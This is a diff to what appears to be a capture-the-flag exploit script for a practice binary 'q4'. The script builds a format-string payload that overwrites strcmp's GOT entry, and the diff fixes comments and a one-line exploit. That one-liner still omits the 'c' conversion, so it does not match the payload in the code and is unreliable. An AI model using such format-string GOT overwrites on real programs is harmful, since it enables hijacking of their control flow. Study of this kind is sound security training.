@@ -67,14 +67,14 @@ overwrite_hex = 0x8691
 ## e.g. %6$p -> 0x080499fc
 payload =  p32(strcmp_got_addr)# -> 4byte
 ## GOT overwrite
-## %c -> show n bytes char
-## %hn -> write 4bytes somewhere
+## %c -> print n bytes char
+## %hn -> write 2bytes somewhere
 ## Why (overwrite_hex - 4) ?
 ## -> p32(strcmp_got_addr) is 4bytes
 payload += "%{0}c%6$hn".format(overwrite_hex - 4).encode()
 
-## So oneline explitation is
-## $ echo "\xfc\x99\x04\x08%34445%6\$hn" | ./q4
+## So oneline exploit is
+## $ echo -e "\xfc\x99\x04\x08%34445%6\$hn" | ./q4
 
 p.recvuntil("?")
 p.sendline(payload)
